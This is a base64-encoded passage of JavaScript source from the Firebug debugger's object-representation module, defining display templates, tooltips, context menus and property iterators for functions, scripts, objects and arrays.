9IGZpbmRTb3VyY2VGb3JGdW5jdGlvbihmbiwgY29udGV4dCk7DQogICAgICAgIGlmIChzb3VyY2VMaW5rKQ0KICAgICAgICAgICAgRmlyZWJ1Zy5jaHJvbWUuc2VsZWN0KHNvdXJjZUxpbmspOw0KICAgICAgICBpZiAoRkJUcmFjZS5EQkdfRlVOQ1RJT05fTkFNRSkNCiAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJyZXBzLmZ1bmN0aW9uLmluc3BlY3RPYmplY3Qgc2VsZWN0ZWQgc291cmNlTGluayBpcyAiLCBzb3VyY2VMaW5rKTsNCiAgICB9LA0KDQogICAgZ2V0VG9vbHRpcDogZnVuY3Rpb24oZm4sIGNvbnRleHQpDQogICAgew0KICAgICAgICB2YXIgc2NyaXB0ID0gZmluZFNjcmlwdEZvckZ1bmN0aW9uSW5Db250ZXh0KGNvbnRleHQsIGZuKTsNCiAgICAgICAgaWYgKHNjcmlwdCkNCiAgICAgICAgICAgIHJldHVybiAkU1RSRigiTGluZSIsIFtub3JtYWxpemVVUkwoc2NyaXB0LmZpbGVOYW1lKSwgc2NyaXB0LmJhc2VMaW5lTnVtYmVyXSk7DQogICAgICAgIGVsc2UNCiAgICAgICAgICAgIGlmIChmbi50b1N0cmluZykNCiAgICAgICAgICAgICAgICByZXR1cm4gZm4udG9TdHJpbmcoKTsNCiAgICB9LA0KDQogICAgZ2V0VGl0bGU6IGZ1bmN0aW9uKGZuLCBjb250ZXh0KQ0KICAgIHsNCiAgICAgICAgdmFyIG5hbWUgPSBmbi5uYW1lID8gZm4ubmFtZSA6ICJmdW5jdGlvbiI7DQogICAgICAgIHJldHVybiBuYW1lICsgIigpIjsNCiAgICB9LA0KDQogICAgZ2V0Q29udGV4dE1lbnVJdGVtczogZnVuY3Rpb24oZm4sIHRhcmdldCwgY29udGV4dCwgc2NyaXB0KQ0KICAgIHsNCiAgICAgICAgaWYgKCFzY3JpcHQpDQogICAgICAgICAgICBzY3JpcHQgPSBmaW5kU2NyaXB0Rm9yRnVuY3Rpb25JbkNvbnRleHQoY29udGV4dCwgZm4pOw0KICAgICAgICBpZiAoIXNjcmlwdCkNCiAgICAgICAgICAgIHJldHVybjsNCg0KICAgICAgICB2YXIgc2NyaXB0SW5mbyA9IGdldFNvdXJjZUZpbGVBbmRMaW5lQnlTY3JpcHQoY29udGV4dCwgc2NyaXB0KTsNCiAgICAgICAgdmFyIG1vbml0b3JlZCA9IHNjcmlwdEluZm8gPyBmYnMuaXNNb25pdG9yZWQoc2NyaXB0SW5mby5zb3VyY2VGaWxlLmhyZWYsIHNjcmlwdEluZm8ubGluZU5vKSA6IGZhbHNlOw0KDQogICAgICAgIHZhciBuYW1lID0gc2NyaXB0ID8gZ2V0RnVuY3Rpb25OYW1lKHNjcmlwdCwgY29udGV4dCkgOiBmbi5uYW1lOw0KICAgICAgICByZXR1cm4gWw0KICAgICAgICAgICAge2xhYmVsOiAiQ29weVNvdXJjZSIsIGNvbW1hbmQ6IGJpbmRGaXhlZCh0aGlzLmNvcHlTb3VyY2UsIHRoaXMsIGZuKSB9LA0KICAgICAgICAgICAgIi0iLA0KICAgICAgICAgICAge2xhYmVsOiAkU1RSRigiU2hvd0NhbGxzSW5Db25zb2xlIiwgW25hbWVdKSwgbm9sMTBuOiB0cnVlLA0KICAgICAgICAgICAgIHR5cGU6ICJjaGVja2JveCIsIGNoZWNrZWQ6IG1vbml0b3JlZCwNCiAgICAgICAgICAgICBjb21tYW5kOiBiaW5kRml4ZWQodGhpcy5tb25pdG9yLCB0aGlzLCBmbiwgc2NyaXB0LCBtb25pdG9yZWQpIH0NCiAgICAgICAgXTsNCiAgICB9DQp9KTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovKg0KdGhpcy5qc2RTY3JpcHQgPSBkb21wbGF0ZShGaXJlYnVnLlJlcCwNCnsNCiAgICBjb3B5U291cmNlOiBmdW5jdGlvbihzY3JpcHQpDQogICAgew0KICAgICAgICB2YXIgZm4gPSBzY3JpcHQuZnVuY3Rpb25PYmplY3QuZ2V0V3JhcHBlZFZhbHVlKCk7DQogICAgICAgIHJldHVybiBGaXJlYnVnUmVwcy5GdW5jLmNvcHlTb3VyY2UoZm4pOw0KICAgIH0sDQoNCiAgICBtb25pdG9yOiBmdW5jdGlvbihmbiwgc2NyaXB0LCBtb25pdG9yZWQpDQogICAgew0KICAgICAgICBmbiA9IHNjcmlwdC5mdW5jdGlvbk9iamVjdC5nZXRXcmFwcGVkVmFsdWUoKTsNCiAgICAgICAgcmV0dXJuIEZpcmVidWdSZXBzLkZ1bmMubW9uaXRvcihmbiwgc2NyaXB0LCBtb25pdG9yZWQpOw0KICAgIH0sDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCiAgICBjbGFzc05hbWU6ICJqc2RTY3JpcHQiLA0KICAgIGluc3BlY3RhYmxlOiBmYWxzZSwNCg0KICAgIHN1cHBvcnRzT2JqZWN0OiBmdW5jdGlvbihvYmplY3QsIHR5cGUpDQogICAgew0KICAgICAgICByZXR1cm4gb2JqZWN0IGluc3RhbmNlb2YganNkSVNjcmlwdDsNCiAgICB9LA0KDQogICAgaW5zcGVjdE9iamVjdDogZnVuY3Rpb24oc2NyaXB0LCBjb250ZXh0KQ0KICAgIHsNCiAgICAgICAgdmFyIHNvdXJjZUxpbmsgPSBnZXRTb3VyY2VMaW5rRm9yU2NyaXB0KHNjcmlwdCwgY29udGV4dCk7DQogICAgICAgIGlmIChzb3VyY2VMaW5rKQ0KICAgICAgICAgICAgRmlyZWJ1Zy5jaHJvbWUuc2VsZWN0KHNvdXJjZUxpbmspOw0KICAgIH0sDQoNCiAgICBnZXRSZWFsT2JqZWN0OiBmdW5jdGlvbihzY3JpcHQsIGNvbnRleHQpDQogICAgew0KICAgICAgICByZXR1cm4gc2NyaXB0Ow0KICAgIH0sDQoNCiAgICBnZXRUb29sdGlwOiBmdW5jdGlvbihzY3JpcHQpDQogICAgew0KICAgICAgICByZXR1cm4gJFNUUkYoImpzZElTY3JpcHQiLCBbc2NyaXB0LnRhZ10pOw0KICAgIH0sDQoNCiAgICBnZXRUaXRsZTogZnVuY3Rpb24oc2NyaXB0LCBjb250ZXh0KQ0KICAgIHsNCiAgICAgICAgdmFyIGZuID0gc2NyaXB0LmZ1bmN0aW9uT2JqZWN0LmdldFdyYXBwZWRWYWx1ZSgpOw0KICAgICAgICByZXR1cm4gRmlyZWJ1Z1JlcHMuRnVuYy5nZXRUaXRsZShmbiwgY29udGV4dCk7DQogICAgfSwNCg0KICAgIGdldENvbnRleHRNZW51SXRlbXM6IGZ1bmN0aW9uKHNjcmlwdCwgdGFyZ2V0LCBjb250ZXh0KQ0KICAgIHsNCiAgICAgICAgdmFyIGZuID0gc2NyaXB0LmZ1bmN0aW9uT2JqZWN0LmdldFdyYXBwZWRWYWx1ZSgpOw0KDQogICAgICAgIHZhciBzY3JpcHRJbmZvID0gZ2V0U291cmNlRmlsZUFuZExpbmVCeVNjcmlwdChjb250ZXh0LCBzY3JpcHQpOw0KICAgICAgICAgICB2YXIgbW9uaXRvcmVkID0gc2NyaXB0SW5mbyA/IGZicy5pc01vbml0b3JlZChzY3JpcHRJbmZvLnNvdXJjZUZpbGUuaHJlZiwgc2NyaXB0SW5mby5saW5lTm8pIDogZmFsc2U7DQoNCiAgICAgICAgdmFyIG5hbWUgPSBnZXRGdW5jdGlvbk5hbWUoc2NyaXB0LCBjb250ZXh0KTsNCg0KICAgICAgICByZXR1cm4gWw0KICAgICAgICAgICAge2xhYmVsOiAiQ29weVNvdXJjZSIsIGNvbW1hbmQ6IGJpbmRGaXhlZCh0aGlzLmNvcHlTb3VyY2UsIHRoaXMsIHNjcmlwdCkgfSwNCiAgICAgICAgICAgICItIiwNCiAgICAgICAgICAgIHtsYWJlbDogJFNUUkYoIlNob3dDYWxsc0luQ29uc29sZSIsIFtuYW1lXSksIG5vbDEwbjogdHJ1ZSwNCiAgICAgICAgICAgICB0eXBlOiAiY2hlY2tib3giLCBjaGVja2VkOiBtb25pdG9yZWQsDQogICAgICAgICAgICAgY29tbWFuZDogYmluZEZpeGVkKHRoaXMubW9uaXRvciwgdGhpcywgZm4sIHNjcmlwdCwgbW9uaXRvcmVkKSB9DQogICAgICAgIF07DQogICAgfQ0KfSk7DQovKiovDQovLyoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQp0aGlzLk9iaiA9IGRvbXBsYXRlKEZpcmVidWcuUmVwLA0Kew0KICAgIHRhZzoNCiAgICAgICAgT0JKRUNUTElOSygNCiAgICAgICAgICAgIFNQQU4oeyJjbGFzcyI6ICJvYmplY3RUaXRsZSJ9LCAiJG9iamVjdHxnZXRUaXRsZSAiKSwNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgU1BBTih7ImNsYXNzIjogIm9iamVjdFByb3BzIn0sIA0KICAgICAgICAgICAgICAgIFNQQU4oeyJjbGFzcyI6ICJvYmplY3RMZWZ0QnJhY2UiLCByb2xlOiAicHJlc2VudGF0aW9uIn0sICJ7IiksDQogICAgICAgICAgICAgICAgRk9SKCJwcm9wIiwgIiRvYmplY3R8cHJvcEl0ZXJhdG9yIiwNCiAgICAgICAgICAgICAgICAgICAgU1BBTih7ImNsYXNzIjogIm9iamVjdFByb3BOYW1lIiwgcm9sZTogInByZXNlbnRhdGlvbiJ9LCAiJHByb3AubmFtZSIpLA0KICAgICAgICAgICAgICAgICAgICBTUEFOKHsiY2xhc3MiOiAib2JqZWN0RXF1YWwiLCByb2xlOiAicHJlc2VudGF0aW9uIn0sICIkcHJvcC5lcXVhbCIpLA0KICAgICAgICAgICAgICAgICAgICBUQUcoIiRwcm9wLnRhZyIsIHtvYmplY3Q6ICIkcHJvcC5vYmplY3QifSksDQogICAgICAgICAgICAgICAgICAgIFNQQU4oeyJjbGFzcyI6ICJvYmplY3RDb21tYSIsIHJvbGU6ICJwcmVzZW50YXRpb24ifSwgIiRwcm9wLmRlbGltIikNCiAgICAgICAgICAgICAgICApLA0KICAgICAgICAgICAgICAgIFNQQU4oeyJjbGFzcyI6ICJvYmplY3RSaWdodEJyYWNlIn0sICJ9IikNCiAgICAgICAgICAgICkNCiAgICAgICAgKSwNCg0KICAgIHByb3BOdW1iZXJUYWc6DQogICAgICAgIFNQQU4oeyJjbGFzcyI6ICJvYmplY3RQcm9wLW51bWJlciJ9LCAiJG9iamVjdCIpLA0KDQogICAgcHJvcFN0cmluZ1RhZzoNCiAgICAgICAgU1BBTih7ImNsYXNzIjogIm9iamVjdFByb3Atc3RyaW5nIn0sICImcXVvdDskb2JqZWN0JnF1b3Q7IiksDQoNCiAgICBwcm9wT2JqZWN0VGFnOg0KICAgICAgICBTUEFOKHsiY2xhc3MiOiAib2JqZWN0UHJvcC1vYmplY3QifSwgIiRvYmplY3QiKSwNCg0KICAgIHByb3BJdGVyYXRvcjogZnVuY3Rpb24gKG9iamVjdCkNCiAgICB7DQogICAgICAgIC8vL0ZpcmVidWcuT2JqZWN0U2hvcnRJdGVyYXRvck1heDsNCiAgICAgICAgdmFyIG1heExlbmd0aCA9IDU1OyAvLyBkZWZhdWx0IG1heCBsZW5ndGggZm9yIGxvbmcgcmVwcmVzZW50YXRpb24NCiAgICAgICAgDQogICAgICAgIGlmICghb2JqZWN0KQ0KICAgICAgICAgICAgcmV0dXJuIFtdOw0KDQogICAgICAgIHZhciBwcm9wcyA9IFtdOw0KICAgICAgICB2YXIgbGVuZ3RoID0gMDsNCiAgICAgICAgDQogICAgICAgIHZhciBudW1Qcm9wZXJ0aWVzID0gMDsNCiAgICAgICAgdmFyIG51bVByb3BlcnRpZXNTaG93biA9IDA7DQogICAgICAgIHZhciBtYXhMZW5ndGhSZWFjaGVkID0gZmFsc2U7DQogICAgICAgIA0KICAgICAgICB2YXIgbGliID0gdGhpczsNCiAgICAgICAgDQogICAgICAgIHZhciBwcm9wUmVwc01hcCA9IA0KICAgICAgICB7DQogICAgICAgICAgICAiYm9vbGVhbiI6IHRoaXMucHJvcE51bWJlclRhZywNCiAgICAgICAgICAgICJudW1iZXIiOiB0aGlzLnByb3BOdW1iZXJUYWcsDQogICAgICAgICAgICAic3RyaW5nIjogdGhpcy5wcm9wU3RyaW5nVGFnLA0KICAgICAgICAgICAgIm9iamVjdCI6IHRoaXMucHJvcE9iamVjdFRhZw0KICAgICAgICB9Ow0KDQogICAgICAgIHRyeQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgdGl0bGUgPSBGaXJlYnVnLlJlcC5nZXRUaXRsZShvYmplY3QpOw0KICAgICAgICAgICAgbGVuZ3RoICs9IHRpdGxlLmxlbmd0aDsNCg0KICAgICAgICAgICAgZm9yICh2YXIgbmFtZSBpbiBvYmplY3QpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdmFyIHZhbHVlOw0KICAgICAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdmFsdWUgPSBvYmplY3RbbmFtZV07DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGNhdGNoIChleGMpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgdmFyIHR5cGUgPSB0eXBlb2YodmFsdWUpOw0KICAgICAgICAgICAgICAgIGlmICh0eXBlID09ICJib29sZWFuIiB8fCANCiAgICAgICAgICAgICAgICAgICAgdHlwZSA9PSAibnVtYmVyIiB8fCANCiAgICAgICAgICAgICAgICAgICAgKHR5cGUgPT0gInN0cmluZyIgJiYgdmFsdWUpIHx8IA0KICAgICAgICAgICAgICAgICAgICAodHlwZSA9PSAib2JqZWN0IiAmJiB2YWx1ZSAmJiB2YWx1ZS50b1N0cmluZykpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICB2YXIgdGFnID0gcHJvcFJlcHNNYXBbdHlwZV07DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICB2YXIgdmFsdWUgPSAodHlwZSA9PSAib2JqZWN0IikgPw0KICAgICAgICAgICAgICAgICAgICAgICAgRmlyZWJ1Zy5nZXRSZXAodmFsdWUpLmdldFRpdGxlKHZhbHVlKSA6DQogICAgICAgICAgICAgICAgICAgICAgICB2YWx1ZSArICIiOw0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGxlbmd0aCArPSBuYW1lLmxlbmd0aCArIHZhbHVlLmxlbmd0aCArIDQ7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBpZiAobGVuZ3RoIDw9IG1heExlbmd0aCkNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgcHJvcHMucHVzaCh7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFnOiB0YWcsIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5hbWU6IG5hbWUsIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9iamVjdDogdmFsdWUsIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVxdWFsOiAiPSIsIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRlbGltOiAiLCAiDQogICAgICAgICAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgbnVtUHJvcGVydGllc1Nob3duKys7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgbWF4TGVuZ3RoUmVhY2hlZCA9IHRydWU7DQoNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgbnVtUHJvcGVydGllcysrOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGlmIChtYXhMZW5ndGhSZWFjaGVkICYmIG51bVByb3BlcnRpZXMgPiBudW1Qcm9wZXJ0aWVzU2hvd24pDQogICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAobnVtUHJvcGVydGllcyA+IG51bVByb3BlcnRpZXNTaG93bikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBwcm9wcy5wdXNoKHsNCiAgICAgICAgICAgICAgICAgICAgb2JqZWN0OiAiLi4uIiwgLy94eHhIb256YSBsb2NhbGl6YXRpb24NCiAgICAgICAgICAgICAgICAgICAgdGFnOiBGaXJlYnVnUmVwcy5DYXB0aW9uLnRhZywNCiAgICAgICAgICAgICAgICAgICAgbmFtZTogIiIsDQogICAgICAgICAgICAgICAgICAgIGVxdWFsOiIiLA0KICAgICAgICAgICAgICAgICAgICBkZWxpbToiIg0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZSBpZiAocHJvcHMubGVuZ3RoID4gMCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBwcm9wc1twcm9wcy5sZW5ndGgtMV0uZGVsaW0gPSAnJzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBjYXRjaCAoZXhjKQ0KICAgICAgICB7DQogICAgICAgICAgICAvLyBTb21ldGltZXMgd2UgZ2V0IGV4Y2VwdGlvbnMgd2hlbiB0cnlpbmcgdG8gcmVhZCBmcm9tIGNlcnRhaW4gb2JqZWN0cywgbGlrZQ0KICAgICAgICAgICAgLy8gU3RvcmFnZUxpc3QsIGJ1dCBkb24ndCBsZXQgdGhhdCBndW0gdXAgdGhlIHdvcmtzDQogICAgICAgICAgICAvLyBYWFhqamIgYWxzbyBIaXN0b3J5LnByZXZpb3VzIGZhaWxzIGJlY2F1c2Ugb2JqZWN0IGlzIGEgd2ViLXBhZ2Ugb2JqZWN0IHdoaWNoIGRvZXMgbm90IGhhdmUNCiAgICAgICAgICAgIC8vIHBlcm1pc3Npb24gdG8gcmVhZCB0aGUgaGlzdG9yeQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiBwcm9wczsNCiAgICB9LA0KICAgIA0KICAgIGZiXzFfNl9wcm9wSXRlcmF0b3I6IGZ1bmN0aW9uIChvYmplY3QsIG1heCkNCiAgICB7DQogICAgICAgIG1heCA9IG1heCB8fCAzOw0KICAgICAgICBpZiAoIW9iamVjdCkNCiAgICAgICAgICAgIHJldHVybiBbXTsNCg0KICAgICAgICB2YXIgcHJvcHMgPSBbXTsNCiAgICAgICAgdmFyIGxlbiA9IDAsIGNvdW50ID0gMDsNCg0KICAgICAgICB0cnkNCiAgICAgICAgew0KICAgICAgICAgICAgZm9yICh2YXIgbmFtZSBpbiBvYmplY3QpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdmFyIHZhbHVlOw0KICAgICAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdmFsdWUgPSBvYmplY3RbbmFtZV07DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGNhdGNoIChleGMpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsNCiAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICB2YXIgdCA9IHR5cGVvZih2YWx1ZSk7DQogICAgICAgICAgICAgICAgaWYgKHQgPT0gImJvb2xlYW4iIHx8IHQgPT0gIm51bWJlciIgfHwgKHQgPT0gInN0cmluZyIgJiYgdmFsdWUpDQogICAgICAgICAgICAgICAgICAgIHx8ICh0ID09ICJvYmplY3QiICYmIHZhbHVlICYmIHZhbHVlLnRvU3RyaW5nKSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHZhciByZXAgPSBGaXJlYnVnLmdldFJlcCh2YWx1ZSk7DQogICAgICAgICAgICAgICAgICAgIHZhciB0YWcgPSByZXAuc2hvcnRUYWcgfHwgcmVwLnRhZzsNCiAgICAgICAgICAgICAgICAgICAgaWYgKHQgPT0gIm9iamVjdCIpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlID0gcmVwLmdldFRpdGxlKHZhbHVlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHRhZyA9IHJlcC50aXRsZVRhZzsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBjb3VudCsrOw0KICAgICAgICAgICAgICAgICAgICBpZiAoY291bnQgPD0gbWF4KQ0KICAgICAgICAgICAgICAgICAgICAgICAgcHJvcHMucHVzaCh7dGFnOiB0YWcsIG5hbWU6IG5hbWUsIG9iamVjdDogdmFsdWUsIGVxdWFsOiAiPSIsIGRlbGltOiAiLCAifSk7DQogICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmIChjb3VudCA+IG1heCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBwcm9wc1tNYXRoLm1heCgxLG1heC0xKV0gPSB7DQogICAgICAgICAgICAgICAgICAgIG9iamVjdDogIm1vcmUuLi4iLCAvL3h4eEhvbnphIGxvY2FsaXphdGlvbg0KICAgICAgICAgICAgICAgICAgICB0YWc6IEZpcmVidWdSZXBzLkNhcHRpb24udGFnLA0KICAgICAgICAgICAgICAgICAgICBuYW1lOiAiIiwNCiAgICAgICAgICAgICAgICAgICAgZXF1YWw6IiIsDQogICAgICAgICAgICAgICAgICAgIGRlbGltOiIiDQogICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UgaWYgKHByb3BzLmxlbmd0aCA+IDApDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcHJvcHNbcHJvcHMubGVuZ3RoLTFdLmRlbGltID0gJyc7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgY2F0Y2ggKGV4YykNCiAgICAgICAgew0KICAgICAgICAgICAgLy8gU29tZXRpbWVzIHdlIGdldCBleGNlcHRpb25zIHdoZW4gdHJ5aW5nIHRvIHJlYWQgZnJvbSBjZXJ0YWluIG9iamVjdHMsIGxpa2UNCiAgICAgICAgICAgIC8vIFN0b3JhZ2VMaXN0LCBidXQgZG9uJ3QgbGV0IHRoYXQgZ3VtIHVwIHRoZSB3b3Jrcw0KICAgICAgICAgICAgLy8gWFhYampiIGFsc28gSGlzdG9yeS5wcmV2aW91cyBmYWlscyBiZWNhdXNlIG9iamVjdCBpcyBhIHdlYi1wYWdlIG9iamVjdCB3aGljaCBkb2VzIG5vdCBoYXZlDQogICAgICAgICAgICAvLyBwZXJtaXNzaW9uIHRvIHJlYWQgdGhlIGhpc3RvcnkNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gcHJvcHM7DQogICAgfSwNCiAgICANCiAgICAvKg0KICAgIHByb3BJdGVyYXRvcjogZnVuY3Rpb24gKG9iamVjdCkNCiAgICB7DQogICAgICAgIGlmICghb2JqZWN0KQ0KICAgICAgICAgICAgcmV0dXJuIFtdOw0KDQogICAgICAgIHZhciBwcm9wcyA9IFtdOw0KICAgICAgICB2YXIgbGVuID0gMDsNCg0KICAgICAgICB0cnkNCiAgICAgICAgew0KICAgICAgICAgICAgZm9yICh2YXIgbmFtZSBpbiBvYmplY3QpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdmFyIHZhbDsNCiAgICAgICAgICAgICAgICB0cnkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHZhbCA9IG9iamVjdFtuYW1lXTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgY2F0Y2ggKGV4YykNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOw0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIHZhciB0ID0gdHlwZW9mIHZhbDsNCiAgICAgICAgICAgICAgICBpZiAodCA9PSAiYm9vbGVhbiIgfHwgdCA9PSAibnVtYmVyIiB8fCAodCA9PSAic3RyaW5nIiAmJiB2YWwpDQogICAgICAgICAgICAgICAgICAgIHx8ICh0ID09ICJvYmplY3QiICYmICFpc0Z1bmN0aW9uKHZhbCkgJiYgdmFsICYmIHZhbC50b1N0cmluZykpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICB2YXIgdGl0bGUgPSAodCA9PSAib2JqZWN0IikNCiAgICAgICAgICAgICAgICAgICAgICAgID8gRmlyZWJ1Zy5nZXRSZXAodmFsKS5nZXRUaXRsZSh2YWwpDQogICAgICAgICAgICAgICAgICAgICAgICA6IHZhbCsiIjsNCg0KICAgICAgICAgICAgICAgICAgICBsZW4gKz0gbmFtZS5sZW5ndGggKyB0aXRsZS5sZW5ndGggKyAxOw0KICAgICAgICAgICAgICAgICAgICBpZiAobGVuIDwgNTApDQogICAgICAgICAgICAgICAgICAgICAgICBwcm9wcy5wdXNoKHtuYW1lOiBuYW1lLCB2YWx1ZTogdGl0bGV9KTsNCiAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGNhdGNoIChleGMpDQogICAgICAgIHsNCiAgICAgICAgICAgIC8vIFNvbWV0aW1lcyB3ZSBnZXQgZXhjZXB0aW9ucyB3aGVuIHRyeWluZyB0byByZWFkIGZyb20gY2VydGFpbiBvYmplY3RzLCBsaWtlDQogICAgICAgICAgICAvLyBTdG9yYWdlTGlzdCwgYnV0IGRvbid0IGxldCB0aGF0IGd1bSB1cCB0aGUgd29ya3MNCiAgICAgICAgICAgIC8vIFhYWGpqYiBhbHNvIEhpc3RvcnkucHJldmlvdXMgZmFpbHMgYmVjYXVzZSBvYmplY3QgaXMgYSB3ZWItcGFnZSBvYmplY3Qgd2hpY2ggZG9lcyBub3QgaGF2ZQ0KICAgICAgICAgICAgLy8gcGVybWlzc2lvbiB0byByZWFkIHRoZSBoaXN0b3J5DQogICAgICAgIH0NCg0KICAgICAgICByZXR1cm4gcHJvcHM7DQogICAgfSwNCiAgICAvKiovDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCiAgICBjbGFzc05hbWU6ICJvYmplY3QiLA0KDQogICAgc3VwcG9ydHNPYmplY3Q6IGZ1bmN0aW9uKG9iamVjdCwgdHlwZSkNCiAgICB7DQogICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0NCn0pOw0KDQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQp0aGlzLkFyciA9IGRvbXBsYXRlKEZpcmVidWcuUmVwLA0Kew0KICAgIHRhZzoNCiAgICAgICAgT0JKRUNUQk9YKHtfcmVwT2JqZWN0OiAiJG9iamVjdCJ9LA0KICAgICAgICAgICAgU1BBTih7ImNsYXNzIjogImFycmF5TGVmdEJyYWNrZXQiLCByb2xlIDogInByZXNlbnRhdGlvbiJ9LCAiWyIpLA0KICAgICAgICAgICAgRk9SKCJpdGVtIiwgIiRvYmplY3R8YXJyYXlJdGVyYXRvciIsDQogICAgICAgICAgICAgICAgVEFHKCIkaXRlbS50YWciLCB7b2JqZWN0OiAiJGl0ZW0ub2JqZWN0In0pLA0KICAgICAgICAgICAgICAgIFNQQU4oeyJjbGFzcyI6ICJhcnJheUNvbW1hIiwgcm9sZSA6ICJwcmVzZW50YXRpb24ifSwgIiRpdGVtLmRlbGltIikNCiAgICAgICAgICAgICksDQogICAgICAgICAgICBTUEFOKHsiY2xhc3MiOiAiYXJyYXlSaWdodEJyYWNrZXQiLCByb2xlIDogInByZXNlbnRhdGlvbiJ9LCAiXSIpDQogICAgICAgICksDQoNCiAgICBzaG9ydFRhZzoNCiAgICAgICAgT0JKRUNUQk9YKHtfcmVwT2JqZWN0OiAiJG9iamVjdCJ9LA0KICAgICAgICAgICAgU1BBTih7ImNsYXNzIjogImFycmF5TGVmdEJyYWNrZXQiLCByb2xlIDogInByZXNlbnRhdGlvbiJ9LCAiWyIpLA0KICAgICAgICAgICAgRk9SKCJpdGVtIiwgIiRvYmplY3R8c2hvcnRBcnJheUl0ZXJhdG9yIiwNCiAgICAgICAgICAgICAgICBUQUcoIiRpdGVtLnRhZyIsIHtvYmplY3Q6ICIkaXRlbS5vYmplY3QifSksDQogICAgICAgICAgICAgICAgU1BBTih7ImNsYXNzIjogImFycmF5Q29tbWEiLCByb2xlIDogInByZXNlbnRhdGlvbiJ9LCAiJGl0ZW0uZGVsaW0iKQ0KICAgICAgICAg